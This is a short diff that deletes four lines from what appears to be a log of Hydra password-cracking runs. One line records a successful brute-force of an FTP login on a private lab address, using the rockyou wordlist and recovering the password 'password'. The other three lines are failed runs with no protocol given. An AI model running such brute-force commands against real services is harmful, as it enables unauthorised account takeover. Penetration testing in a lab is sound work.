@@ -1,4 +1,0 @@
-2025-12-03 16:43:31; SUCCESS; hydra -l kali -P /usr/share/wordlists/rockyou.txt -t 16 192.168.215.2 ftp; 192.168.215.2; ftp; password; 4,52s 
-2025-12-03 17:36:55; FAILED; hydra -t 16 -v; ; No protocol; Not found; 0,13s 
-2025-12-03 17:36:58; FAILED; hydra -t 16 -v; ; No protocol; Not found; 0,09s 
-2025-12-03 17:37:00; FAILED; hydra -t 16 -v; ; No protocol; Not found; 0,09s 
